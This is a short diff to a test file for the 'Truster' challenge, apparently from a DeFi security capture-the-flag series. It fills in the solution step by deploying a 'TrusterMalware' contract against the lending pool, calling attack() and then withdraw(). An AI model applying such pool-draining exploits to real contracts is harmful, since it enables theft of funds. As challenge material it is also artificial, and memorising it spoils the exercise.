@@ -22,7 +22,9 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const malware = await (await ethers.getContractFactory('TrusterMalware', player)).deploy(pool.address);
+        await malware.attack();
+        await malware.withdraw();
     });
 
     after(async function () {
